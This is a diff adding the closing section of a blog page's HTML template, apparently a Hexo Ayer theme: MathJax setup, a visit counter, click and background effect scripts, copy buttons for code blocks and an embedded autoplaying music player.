+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+</body>
+
+</html>
